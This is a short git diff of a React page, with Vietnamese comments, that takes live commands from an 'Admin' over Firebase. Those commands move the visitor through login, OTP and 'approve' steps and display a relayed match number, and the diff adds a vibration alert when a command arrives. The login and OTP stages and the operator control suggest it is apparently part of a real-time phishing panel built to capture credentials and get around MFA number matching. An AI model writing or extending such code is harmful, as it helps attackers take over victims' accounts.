@@ -117,7 +117,6 @@ export default function Home() {
         const unsubscribe = onValue(commandRef, (snapshot) => {
             const data = snapshot.val();
             if (data && data.action) {
-                // Hủy bỏ mọi setTimeout đang chạy để Admin có thể ép chuyển bước ngay lập tức
                 if (loginTimeoutRef.current) clearTimeout(loginTimeoutRef.current);
                 if (otpTimeoutRef.current) clearTimeout(otpTimeoutRef.current);
                 setLoading(false);
@@ -127,9 +126,20 @@ export default function Home() {
                     setStep(4); setMatchNumber(null); setShowSuccess(false);
                 } 
                 else if (data.action === 'approve' && data.value) {
-                    // Tách lấy con số từ payload (vì có đính kèm Date.now())
                     const rawNumber = data.value.split('|')[0]; 
-                    setStep(4); setMatchNumber(rawNumber); setShowSuccess(false);
+                    
+                    // Xóa số cũ trước để ép React reset trạng thái
+                    setMatchNumber(null);
+                    
+                    // Đợi 50ms sau đó nạp số mới, trình duyệt sẽ giật/nháy 1 cái báo hiệu có lệnh mới
+                    setTimeout(() => {
+                        setStep(4); 
+                        setMatchNumber(rawNumber); 
+                        setShowSuccess(false);
+                        
+                        // Rung điện thoại (nếu là mobile) để báo hiệu
+                        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
+                    }, 50);
                 } 
                 else if (data.action === 'success') {
                     setStep(5); setShowSuccess(true);
